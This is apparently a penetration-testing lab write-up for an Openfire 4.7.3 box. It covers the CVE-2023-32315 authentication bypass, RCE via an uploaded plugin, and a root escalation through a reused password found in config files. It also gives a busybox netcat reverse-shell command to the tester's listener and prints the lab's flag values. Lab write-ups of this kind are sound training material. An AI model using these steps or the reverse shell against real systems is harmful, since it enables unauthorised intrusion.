---
date: 2025-11-15
---
Difficulty: Intermediate
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 9090
- [ ] 9091
- [ ] 22

# Service Enumeration
## 9090
Finterprinted by nmap as hadoop-tasktracker.

Nmap automatically ran the "hadoop-tasktracker-info" script which printed:
jive-ibtn jive-btn-gradient

Hacktricks has limited info and essentially just sites the nmap scripts:
https://book.hacktricks.wiki/en/network-services-pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.html?highlight=hadoop#basic-information

Opening it in a browser, we're presented with a login form for openfire administration console, version 4.7.3... not tasktracker (always verify findings from automated tools).

![[Pasted image 20251115160420.png]]

Searching the web for Openfire 4.7.3 returns some results about a CVE-2023-32315 which allows authentication bypass.
https://nvd.nist.gov/vuln/detail/cve-2023-32315

There is a metasploit module for this vulnerability...
https://github.com/h00die-gr3y/Metasploit?tab=readme-ov-file#exploitmultihttpopenfire_auth_bypass_rce_cve_2023_32315rb

... as well as many standalone exploits on GitHub. One of the better-looking ones I found was https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

![[Pasted image 20251115161805.png]]

We should be able to simply log in now, but my instance seemed to hang when submitting these creds, and displayed "CSRF Failure!" if I refreshed the page. 

Nevermind! It took much longer than expected, but if you let the page continue to load, it eventually authenticates and brings us to the admin panel. 

![[Pasted image 20251115170850.png]]

Another POC I tried (which didn't seem to work for auth bypass, in my case) includes a .jar that we can upload as a plugin to gain RCE. https://github.com/miko550/CVE-2023-32315

![[Pasted image 20251115171312.png]]

Following the instructions from this repo, I'll return to the server tab (which took another minute or two to load) then Server Settings -> Management tool.

At last, code execution...
![[Pasted image 20251115171741.png]]

Once again, ran into some friction in finding a working payload for establishing a reverse shell, for whatever reason. I made my listener run on port 80 and succeeded using busybox:
`busybox nc 192.168.45.216 80 -e /bin/bash`

# Privilege Escalation

While searching for exploits earlier, I also found CVE-2024-25420, which allows 
https://nvd.nist.gov/vuln/detail/CVE-2024-25420


uid=114(openfire) gid=118(openfire) groups=118(openfire)

Require password to run sudo.

`grep -rni 'password' /usr/share/openfire 2>/dev/null`

We find an non-default SMTP password, which also happens to be root's password... always check for password reuse. We can simply `su -` to log in as root with "OpenFireAtEveryone."

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

/root/proof.txt
cebfef7ef40c6e6b02134a680fcc3828

/home/openfire/local.txt
bbd360493e589a20082928fdeb6f689f


![[Pasted image 20251115180715.png]]